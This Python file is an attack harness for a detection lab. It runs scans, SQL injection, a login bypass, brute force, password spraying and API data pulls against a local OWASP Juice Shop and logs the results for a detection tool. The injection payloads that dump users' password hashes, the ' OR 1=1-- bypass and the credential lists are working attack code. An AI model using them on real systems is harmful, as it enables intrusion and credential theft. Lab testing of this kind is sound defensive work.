#!/usr/bin/env python3
"""Live attack engine.

Runs the 11 ATTACKER test cases as REAL attacks against the live local lab
targets (primarily OWASP Juice Shop), streaming every step to the dashboard as
events, and recording what actually happened into the same normalized logs +
manifest + report that the batch engine produces (so ThreatLoop is still fed).

Every metric reported here is measured from real traffic. Nothing is fabricated.

Only ever point this at local, intentionally vulnerable lab targets.
"""
import json
import os
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.join(ROOT, "lib"))
sys.path.insert(0, os.path.join(ROOT, "targets"))

import run as engine          # noqa: E402  (normalized-log + finalize helpers)
import prompt_handler         # noqa: E402
import db                     # noqa: E402  (attack history database)

JUICE_URL = os.environ.get("JUICE_URL", "http://localhost:3000").rstrip("/")
ATTACKER_IP = "203.0.113.66"   # the attacker's apparent source, for the logs


# --------------------------------------------------------------------------- #
# HTTP / socket helpers (real traffic)
# --------------------------------------------------------------------------- #
def http(method, url, body=None, timeout=6):
    data = None
    headers = {"User-Agent": "attacker-live/1.0"}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            payload = resp.read()
            return resp.status, payload, int((time.time() - t0) * 1000)
    except urllib.error.HTTPError as e:
        payload = e.read()
        return e.code, payload, int((time.time() - t0) * 1000)
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode(), int((time.time() - t0) * 1000)


def tcp_open(host, port, timeout=0.4):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        return s.connect_ex((host, port)) == 0
    finally:
        s.close()


def now():
    return datetime.now(timezone.utc)


# --------------------------------------------------------------------------- #
# Run context: streams dashboard events AND records normalized logs
# --------------------------------------------------------------------------- #
class Ctx:
    def __init__(self, run_dir, emit):
        self.run_dir = run_dir
        self._emit = emit
        self.tc = None
        self.start = None
        self.metrics = {}
        self.results = []
        self.totals = {"failed_logins": 0, "compromises": 0, "ports": 0,
                       "exfil_bytes": 0, "records_stolen": 0, "injections": 0}

    def event(self, etype, **kw):
        ev = {"type": etype, "ts": now().isoformat()}
        ev.update(kw)
        self._emit(ev)

    # dashboard-facing ------------------------------------------------------- #
    def tc_start(self, tc):
        self.tc = tc
        self.start = now()
        self.metrics = {}
        self.event("tc_start", id=tc["id"], name=tc["name"],
                   technique=tc["technique"], tool=tc["tool"],
                   target=tc["target"], impact=tc.get("impact", ""))

    def activity(self, msg, kind="info", detail=None):
        self.event("activity", id=self.tc["id"], kind=kind, msg=msg, detail=detail)

    def metric(self, **kw):
        self.metrics.update(kw)
        self.event("metric", id=self.tc["id"], metrics=dict(self.metrics))

    def tc_end(self, status, summary):
        self.event("tc_end", id=self.tc["id"], status=status, summary=summary,
                   damage=self.tc.get("impact", ""), metrics=dict(self.metrics))
        self.event("totals", totals=dict(self.totals))
        self.results.append({
            "id": self.tc["id"], "name": self.tc["name"],
            "technique": self.tc["technique"], "status": status,
            "summary": summary, "metrics": dict(self.metrics),
        })
        engine.write_tcmark(self.run_dir, self.tc, self.start, now())

    # log-facing (same schema as the batch engine) -------------------------- #
    def log_auth(self, line, host="juice-shop"):
        engine.emit_auth(self.run_dir, now(), host, line)

    def log_net(self, **kw):
        engine.emit_net(self.run_dir, now(), **kw)

    def log_proxy(self, **kw):
        engine.emit_proxy(self.run_dir, now(), **kw)


# --------------------------------------------------------------------------- #
# Real attacks — each takes the Ctx and the catalog test case
# --------------------------------------------------------------------------- #
PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 587,
         993, 995, 1433, 1521, 2049, 3000, 3306, 3389, 5000, 5432, 5900, 6379,
         8000, 8080, 8443, 9000, 9200, 11211, 27017]


def _scan_host():
    return urllib.parse.urlparse(JUICE_URL).hostname or "localhost"


def attack_port_scan(ctx, tc, slow=False):
    host = _scan_host()
    ports = PORTS if not slow else PORTS[:18]
    probed, found = 0, []
    ctx.activity("Starting %s TCP connect scan of %s" %
                 ("slow " if slow else "", host), kind="info")
    for p in ports:
        is_open = tcp_open(host, p)
        probed += 1
        state = "OPEN" if is_open else "closed"
        ctx.log_net(src_ip=ATTACKER_IP, src_port=50000 + probed, dst_ip=host,
                    dst_port=p, proto="tcp", service="",
                    orig_bytes=0, resp_bytes=0,
                    conn_state="SF" if is_open else "REJ")
        if is_open:
            found.append(p)
            ctx.activity("port %d %s" % (p, state), kind="hit",
                         detail="service reachable")
        ctx.metric(ports_probed=probed, ports_open=len(found),
                   open_ports=found)
        if slow:
            time.sleep(0.15)
    ctx.totals["ports"] += probed
    ctx.tc_end("success", "%d ports probed, %d open: %s"
               % (probed, len(found), ", ".join(map(str, found)) or "none"))


SQLI_COLUMN_TRIES = [10, 9, 11, 8, 7, 6]


def _sqli_payload(cols, encoded=False):
    """Human-readable SQL payload (logged as-is). Transport-encoding is applied
    separately in attack_sqli so both variants reach the server correctly."""
    if encoded:
        sel = ",".join(["id", "email", "password"] +
                       ["'%d'" % i for i in range(4, cols + 1)])
        # Obfuscated with inline comments in place of whitespace.
        return "qwert'))/**/UNION/**/SELECT/**/%s/**/FROM/**/Users--" % sel
    sel = ", ".join(["id", "email", "password"] +
                    ["'%d'" % i for i in range(4, cols + 1)])
    return "qwert')) UNION SELECT %s FROM Users--" % sel


def attack_sqli(ctx, tc, encoded=False):
    stolen, requests_sent = [], 0
    ctx.activity("Probing /rest/products/search for SQL injection%s"
                 % (" (encoded/obfuscated)" if encoded else ""), kind="info")
    status = "partial"
    summary = "injection sent; no rows extracted"
    for cols in SQLI_COLUMN_TRIES:
        q = _sqli_payload(cols, encoded)
        url = "%s/rest/products/search?q=%s" % (JUICE_URL, urllib.parse.quote(q, safe=""))
        code, body, ms = http("GET", url)
        requests_sent += 1
        ctx.log_proxy(src_ip=ATTACKER_IP, host=_scan_host(), method="GET",
                      path="/rest/products/search", query=q, status=code,
                      bytes=len(body), user_agent="sqlmap/1.7", resp_time_ms=ms)
        ctx.activity("GET /rest/products/search?q=%s… -> HTTP %d"
                     % (q[:40], code), kind="request", detail="%d bytes" % len(body))
        rows = _extract_creds(body)
        ctx.metric(requests=requests_sent, records_stolen=len(stolen))
        if rows:
            stolen = rows
            status = "success"
            summary = "UNION injection dumped %d user records" % len(rows)
            for r in rows[:12]:
                ctx.activity("LEAKED  %s" % r["email"], kind="creds",
                             detail=r["password"])
            ctx.event("loot", id=tc["id"], rows=rows)
            break
    ctx.totals["injections"] += requests_sent
    ctx.totals["records_stolen"] += len(stolen)
    ctx.metric(requests=requests_sent, records_stolen=len(stolen))
    ctx.tc_end(status, summary)


def _extract_creds(body):
    try:
        data = json.loads(body.decode("utf-8", "replace"))
    except Exception:  # noqa: BLE001
        return []
    rows = data.get("data") if isinstance(data, dict) else data
    if not isinstance(rows, list):
        return []
    out = []
    for item in rows:
        if not isinstance(item, dict):
            continue
        email = None
        pw = None
        for v in item.values():
            if isinstance(v, str) and "@" in v and "." in v and " " not in v:
                email = v
            if isinstance(v, str) and len(v) == 32 and all(
                    c in "0123456789abcdef" for c in v.lower()):
                pw = v
        if email:
            out.append({"email": email, "password": pw or "(hash not in row)"})
    return out


WEAK_CREDS = [("admin@juice-sh.op", "admin"), ("admin@juice-sh.op", "password"),
              ("admin@juice-sh.op", "123456"), ("admin@juice-sh.op", "letmein"),
              ("admin@juice-sh.op", "admin123"), ("admin@juice-sh.op", "root")]


def _login(email, password):
    code, body, ms = http("POST", "%s/rest/user/login" % JUICE_URL,
                          body={"email": email, "password": password})
    token = None
    try:
        token = json.loads(body).get("authentication", {}).get("token")
    except Exception:  # noqa: BLE001
        pass
    return code, token, ms


def attack_bruteforce(ctx, tc):
    failed = 0
    ctx.activity("Brute forcing admin@juice-sh.op via /rest/user/login", kind="info")
    for email, pw in WEAK_CREDS:
        code, token, ms = _login(email, pw)
        ctx.log_auth("app[%d]: Failed password for %s from %s"
                     % (10000 + failed, email, ATTACKER_IP))
        ctx.log_net(src_ip=ATTACKER_IP, src_port=40000 + failed, dst_ip=_scan_host(),
                    dst_port=3000, proto="tcp", service="http",
                    orig_bytes=120, resp_bytes=80, conn_state="SF")
        failed += 1
        ctx.activity("try %s:%s -> HTTP %d (rejected)" % (email, pw, code),
                     kind="request")
        ctx.metric(failed_logins=failed, compromised=False)
        time.sleep(0.1)
    # The real Juice Shop SQLi auth-bypass: logs in as the first user (admin).
    ctx.activity("Switching to SQLi auth bypass: email=\"' OR 1=1--\"", kind="info")
    code, token, ms = _login("' OR 1=1--", "anything")
    ctx.totals["failed_logins"] += failed
    if token:
        ctx.log_auth("app[%d]: Accepted login for admin@juice-sh.op from %s"
                     % (19999, ATTACKER_IP))
        ctx.totals["compromises"] += 1
        ctx.metric(failed_logins=failed, compromised=True)
        ctx.activity("ADMIN COMPROMISED — auth token obtained", kind="creds",
                     detail=token[:48] + "…")
        ctx.tc_end("success", "%d failed logins, then SQLi bypass -> admin compromised"
                   % failed)
    else:
        ctx.tc_end("partial", "%d failed logins; bypass did not return a token" % failed)


SPRAY_ACCOUNTS = ["admin@juice-sh.op", "jim@juice-sh.op", "bender@juice-sh.op",
                  "mc.safesearch@juice-sh.op", "support@juice-sh.op",
                  "morty@juice-sh.op", "stan@juice-sh.op", "ben@juice-sh.op",
                  "bjoern@juice-sh.op", "ciso@juice-sh.op", "wurstbrot@juice-sh.op",
                  "accountant@juice-sh.op"]


def attack_spray(ctx, tc):
    attempts = 0
    ctx.activity("Password spray: one password across %d accounts"
                 % len(SPRAY_ACCOUNTS), kind="info")
    for email in SPRAY_ACCOUNTS:
        code, token, ms = _login(email, "Password1")
        ctx.log_auth("app[%d]: Failed password for %s from %s"
                     % (20000 + attempts, email, ATTACKER_IP))
        attempts += 1
        ctx.activity("spray %s -> HTTP %d" % (email, code), kind="request")
        ctx.metric(accounts=attempts, attempts=attempts)
        time.sleep(0.08)
    ctx.totals["failed_logins"] += attempts
    ctx.tc_end("success", "%d accounts sprayed, no lockout triggered" % attempts)


EXFIL_ENDPOINTS = ["/api/Products", "/api/Feedbacks", "/api/Challenges",
                   "/rest/products/search?q=", "/api/Quantitys",
                   "/api/BasketItems", "/api/Users"]


def attack_exfil(ctx, tc, slow=False):
    total = 0
    reqs = 0
    rounds = 2 if not slow else 6
    ctx.activity("Exfiltrating data via repeated API reads%s"
                 % (" (low-and-slow)" if slow else ""), kind="info")
    for _ in range(rounds):
        for ep in EXFIL_ENDPOINTS:
            code, body, ms = http("GET", JUICE_URL + ep)
            n = len(body)
            total += n
            reqs += 1
            ctx.log_net(src_ip=_scan_host(), src_port=3000, dst_ip=ATTACKER_IP,
                        dst_port=443, proto="tcp", service="ssl",
                        orig_bytes=n, resp_bytes=120, conn_state="SF")
            ctx.activity("GET %s -> %d bytes" % (ep, n), kind="request")
            ctx.metric(requests=reqs, bytes=total)
            if slow:
                time.sleep(0.2)
    ctx.totals["exfil_bytes"] += total
    ctx.tc_end("success", "%s exfiltrated over %d reads"
               % (engine.human_bytes(total), reqs))


def attack_impossible_travel(ctx, tc):
    locations = [("New York, US", "198.51.100.23"), ("Singapore, SG", "203.0.113.77")]
    ctx.activity("Logging into one account from two continents seconds apart",
                 kind="info")
    ok = 0
    for city, ip in locations:
        code, token, ms = _login("' OR 1=1--", "anything")
        ctx.log_auth("app[%d]: Accepted login for admin@juice-sh.op from %s"
                     % (30000 + ok, ip))
        ctx.log_proxy(src_ip=ip, host=_scan_host(), method="POST",
                      path="/rest/user/login", query="", status=code,
                      bytes=200, user_agent="Mozilla/5.0", resp_time_ms=ms)
        ok += 1 if token else 0
        ctx.activity("login from %s (%s) -> HTTP %d" % (city, ip, code),
                     kind="creds" if token else "request")
        ctx.metric(locations=len(locations), successful_logins=ok)
        time.sleep(0.5)
    if ok >= 2:
        ctx.totals["compromises"] += 1
    ctx.tc_end("success" if ok >= 2 else "partial",
               "same account logged in from %d distant locations" % ok)


def attack_prompt_injection(ctx, tc, paraphrased=False):
    payloads = (engine.PI_PARAPHRASED if paraphrased else engine.PI_CLASSIC)
    ctx.activity("Sending %d prompt-injection payloads to the handler"
                 % len(payloads), kind="info")
    refused = 0
    for i, p in enumerate(payloads):
        result = prompt_handler.handle_prompt(p)
        ctx.log_proxy(src_ip=ATTACKER_IP, host=_scan_host(), method="POST",
                      path="/handler/prompt", query="", body=p,
                      response=result["response"], status=200,
                      bytes=len(p) + 48, user_agent="python-requests/2.31",
                      resp_time_ms=5)
        if result["flagged"]:
            refused += 1
        ctx.activity("payload: %s" % p[:60], kind="request",
                     detail="handler: " + result["response"])
        ctx.metric(payloads=i + 1, refused=refused)
    ctx.totals["injections"] += len(payloads)
    ctx.tc_end("partial" if refused == len(payloads) else "success",
               "%d injection prompts sent; handler refused %d" % (len(payloads), refused))


RUNNERS = {
    "TC-01": lambda c, t: attack_bruteforce(c, t),
    "TC-02": lambda c, t: attack_spray(c, t),
    "TC-03": lambda c, t: attack_port_scan(c, t, slow=False),
    "TC-04": lambda c, t: attack_sqli(c, t, encoded=False),
    "TC-05": lambda c, t: attack_exfil(c, t, slow=False),
    "TC-06": lambda c, t: attack_impossible_travel(c, t),
    "TC-07": lambda c, t: attack_prompt_injection(c, t, paraphrased=False),
    "TC-08": lambda c, t: attack_sqli(c, t, encoded=True),
    "TC-09": lambda c, t: attack_prompt_injection(c, t, paraphrased=True),
    "TC-10": lambda c, t: attack_port_scan(c, t, slow=True),
    "TC-11": lambda c, t: attack_exfil(c, t, slow=True),
}

# Per-TC real source IPs for the recorded manifest.
TC_SOURCE = {
    "TC-06": ["198.51.100.23", "203.0.113.77"],
    "TC-05": ["203.0.113.66"], "TC-11": ["203.0.113.66"],
}


# --------------------------------------------------------------------------- #
# Live report — describes what the attacks ACTUALLY did (not the batch narrative)
# --------------------------------------------------------------------------- #
LIVE_META = {
    "TC-01": ("web login brute force", "Juice Shop /rest/user/login"),
    "TC-02": ("password spray", "Juice Shop /rest/user/login"),
    "TC-03": ("TCP connect scan", "host"),
    "TC-04": ("SQL injection (UNION)", "Juice Shop /rest/products/search"),
    "TC-05": ("API data exfiltration", "Juice Shop REST API"),
    "TC-06": ("session login replay", "Juice Shop /rest/user/login"),
    "TC-07": ("prompt injection", "simulated prompt handler"),
    "TC-08": ("encoded SQL injection", "Juice Shop /rest/products/search"),
    "TC-09": ("paraphrased prompt injection", "simulated prompt handler"),
    "TC-10": ("slow TCP connect scan", "host"),
    "TC-11": ("low-and-slow API exfiltration", "Juice Shop REST API"),
}


def live_damage(tc_id, m, status):
    if status in ("error", "partial") and not m:
        return "attempted; no effect observed"
    if tc_id == "TC-01":
        return ("Admin account compromised — valid auth token stolen."
                if m.get("compromised") else "Login brute force attempted; no valid session.")
    if tc_id == "TC-02":
        return "%d accounts probed, no lockout triggered (valid-account map built)." % m.get("accounts", 0)
    if tc_id in ("TC-03", "TC-10"):
        return "%d open services found of %d probed — attack surface mapped." % (
            m.get("ports_open", 0), m.get("ports_probed", 0))
    if tc_id in ("TC-04", "TC-08"):
        return ("%d user records (emails + password hashes) extracted from the live DB."
                % m.get("records_stolen", 0) if m.get("records_stolen")
                else "Injection sent; DB error disclosed, no rows returned.")
    if tc_id in ("TC-05", "TC-11"):
        return "%s pulled from the app's APIs." % engine.human_bytes(m.get("bytes", 0))
    if tc_id == "TC-06":
        return "Same account logged in from %d distant locations within seconds." % m.get("locations", 0)
    if tc_id in ("TC-07", "TC-09"):
        return "%d injection prompts sent; handler refused %d." % (
            m.get("payloads", 0), m.get("refused", 0))
    return status


def write_live_report(run_dir, run_id, results, totals, target, health):
    report = {"run_id": run_id, "mode": "live", "target": target,
              "target_health": health, "generated_at": now().isoformat(),
              "totals": totals, "attacks": []}
    for r in results:
        tool, tgt = LIVE_META.get(r["id"], (r["technique"], "target"))
        report["attacks"].append({
            "id": r["id"], "name": r["name"], "technique": r["technique"],
            "method": tool, "target": tgt, "status": r["status"],
            "what_happened": r["summary"],
            "result_damage": live_damage(r["id"], r["metrics"], r["status"]),
        })
    with open(os.path.join(run_dir, "report.json"), "w") as fh:
        json.dump(report, fh, indent=2)

    L = ["# ATTACKER Live Run Report — %s" % run_id, "",
         "Generated %s" % report["generated_at"], "",
         "**Mode:** live — every attack below was executed for real against "
         "`%s`. All figures are measured from actual traffic." % target, "",
         "**Target health:** %s throughout (the app stayed reachable; "
         "ThreatLoop's job is to keep it that way)." % health.upper(), "",
         "## What each attack actually did", "",
         "| TC | Attack | Method → Target | What happened | Result / damage |",
         "|----|--------|-----------------|---------------|-----------------|"]
    for a in report["attacks"]:
        L.append("| %s | %s | %s → %s | %s | %s |" % (
            a["id"], a["name"], a["method"], a["target"],
            a["what_happened"], a["result_damage"]))
    L += ["", "## Totals (measured)", "",
          "- Account compromises: %d" % totals["compromises"],
          "- User records stolen: %d" % totals["records_stolen"],
          "- Failed logins generated: %d" % totals["failed_logins"],
          "- Ports probed: %d" % totals["ports"],
          "- Data exfiltrated: %s" % engine.human_bytes(totals["exfil_bytes"]),
          "- Injection attempts: %d" % totals["injections"], ""]
    with open(os.path.join(run_dir, "report.md"), "w") as fh:
        fh.write("\n".join(L) + "\n")


# --------------------------------------------------------------------------- #
# Health monitor + baseline scan + orchestrator (disk-persisted)
# --------------------------------------------------------------------------- #
RUNS_ROOT = os.path.join(ROOT, "runs")
STATE_DIR = os.path.join(ROOT, "state")


def health_check():
    code, _, ms = http("GET", JUICE_URL + "/rest/admin/application-version", timeout=3)
    if code == 0:
        code, _, ms = http("GET", JUICE_URL, timeout=3)
    return ("up" if code and code < 500 else "down"), code, ms


def port_snapshot():
    host = _scan_host()
    return host, [{"port": p, "open": tcp_open(host, p)} for p in PORTS]


def baseline_scan(emit=None):
    """Pre-attack snapshot: scan the clean target's ports + health.

    This is the 'before' picture — the target healthy and uncompromised — that
    the dashboard shows alongside the post-attack 'after' state.
    """
    os.makedirs(STATE_DIR, exist_ok=True)
    if emit:
        emit({"type": "baseline_start", "ts": now().isoformat(), "target": JUICE_URL})
    host, ports = port_snapshot()
    status, code, ms = health_check()
    open_ports = [p["port"] for p in ports if p["open"]]
    snap = {"ts": now().isoformat(), "target": JUICE_URL, "host": host,
            "health": status, "http_code": code, "latency_ms": ms,
            "ports_scanned": len(ports), "open_ports": open_ports, "ports": ports,
            "compromises": 0, "records_stolen": 0,
            "note": "Clean baseline — target healthy, no compromises."}
    with open(os.path.join(STATE_DIR, "baseline.json"), "w") as fh:
        json.dump(snap, fh, indent=2)
    if emit:
        emit({"type": "baseline_done", "ts": now().isoformat(), "baseline": snap})
    return snap


def _load_baseline():
    try:
        with open(os.path.join(STATE_DIR, "baseline.json")) as fh:
            return json.load(fh)
    except Exception:  # noqa: BLE001
        return None


def _write_meta(run_dir, meta):
    with open(os.path.join(run_dir, "meta.json"), "w") as fh:
        json.dump(meta, fh, indent=2)


def _set_current(run_id, status):
    os.makedirs(STATE_DIR, exist_ok=True)
    with open(os.path.join(STATE_DIR, "current.json"), "w") as fh:
        json.dump({"run_id": run_id, "status": status, "ts": now().isoformat()}, fh)


def init_run():
    os.makedirs(RUNS_ROOT, exist_ok=True)
    run_id = datetime.now().strftime("live_%Y%m%d_%H%M%S")
    run_dir = os.path.join(RUNS_ROOT, run_id)
    os.makedirs(run_dir, exist_ok=True)
    with open(os.path.join(run_dir, "_run.json"), "w") as fh:
        json.dump({"run_id": run_id,
                   "base_epoch": int(datetime.now(timezone.utc).timestamp())}, fh)
    return run_id, run_dir


def run_live(emit=None, stop_flag=None):
    """Execute all 11 real attacks.

    Every event is persisted to the run's events.jsonl so the dashboard shows
    the run live AND still shows it after a page refresh or a server restart.
    Events are also passed to emit() when provided (for in-process streaming).
    """
    run_id, run_dir = init_run()
    ev_file = open(os.path.join(run_dir, "events.jsonl"), "a")

    def sink(ev):
        ev_file.write(json.dumps(ev) + "\n")
        ev_file.flush()
        if emit:
            try:
                emit(ev)
            except Exception:  # noqa: BLE001
                pass

    ctx = Ctx(run_dir, sink)
    catalog = engine.load_catalog()
    baseline = _load_baseline()
    started = now().isoformat()

    meta = {"run_id": run_id, "mode": "live", "target": JUICE_URL,
            "started": started, "finished": None, "status": "running",
            "totals": dict(ctx.totals), "baseline": baseline}
    _write_meta(run_dir, meta)
    _set_current(run_id, "running")
    try:
        db.init(STATE_DIR)
        db.upsert(meta, mtime=time.time())
    except Exception:  # noqa: BLE001
        pass

    sink({"type": "run_start", "ts": started, "run_id": run_id,
          "target": JUICE_URL, "total_tcs": len(catalog["test_cases"]),
          "baseline": baseline})

    status, code, ms = health_check()
    sink({"type": "health", "ts": now().isoformat(), "target": JUICE_URL,
          "status": status, "code": code, "latency_ms": ms})
    if status != "up":
        sink({"type": "warning", "ts": now().isoformat(),
              "msg": "Target %s is not reachable (HTTP %s). Start it first "
                     "(./start_targets.sh). Running what it can." % (JUICE_URL, code)})

    for tc in catalog["test_cases"]:
        if stop_flag and stop_flag():
            break
        tc = dict(tc)
        tc["source_ips"] = TC_SOURCE.get(tc["id"], [ATTACKER_IP])
        ctx.tc_start(tc)
        try:
            RUNNERS[tc["id"]](ctx, tc)
        except Exception as e:  # noqa: BLE001
            ctx.activity("attack error: %s" % e, kind="info")
            ctx.tc_end("error", "attack raised: %s" % e)
        st, co, la = health_check()
        sink({"type": "health", "ts": now().isoformat(), "target": JUICE_URL,
              "status": st, "code": co, "latency_ms": la})

    engine.finalize(run_dir, verbose=False)   # logs + manifest for ThreatLoop
    final_status, _, _ = health_check()
    write_live_report(run_dir, run_id, ctx.results, ctx.totals, JUICE_URL, final_status)

    finished = now().isoformat()
    meta.update({"finished": finished, "status": "done",
                 "totals": dict(ctx.totals), "final_health": final_status})
    _write_meta(run_dir, meta)
    _set_current(run_id, "done")
    try:
        db.init(STATE_DIR)
        db.upsert(meta, mtime=os.path.getmtime(run_dir))
    except Exception:  # noqa: BLE001  (DB is an index; never fail a run over it)
        pass

    sink({"type": "run_end", "ts": finished, "run_id": run_id,
          "report_path": os.path.join(run_dir, "report.md"),
          "totals": dict(ctx.totals)})
    ev_file.close()
    return run_dir


def _cli_emit(ev):
    t = ev.get("type")
    if t == "tc_end":
        print("  %-6s %-9s %s" % (ev["id"], ev["status"], ev["summary"]))
    elif t == "run_start":
        print("[attack] run %s -> %s" % (ev["run_id"], ev["target"]))
    elif t == "run_end":
        print("[attack] done. totals: %s" % ev["totals"])
        print("[attack] report: %s" % ev["report_path"])
    elif t == "warning":
        print("[attack][warn] %s" % ev["msg"])


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "attack"
    if mode == "baseline":
        snap = baseline_scan()
        print("[baseline] %s  health=%s (HTTP %s, %sms)"
              % (snap["target"], snap["health"], snap["http_code"], snap["latency_ms"]))
        print("[baseline] %d/%d ports open: %s"
              % (len(snap["open_ports"]), snap["ports_scanned"],
                 ", ".join(map(str, snap["open_ports"])) or "none"))
        print("[baseline] compromises: 0  (clean 'before' snapshot saved)")
    else:
        run_live(_cli_emit)
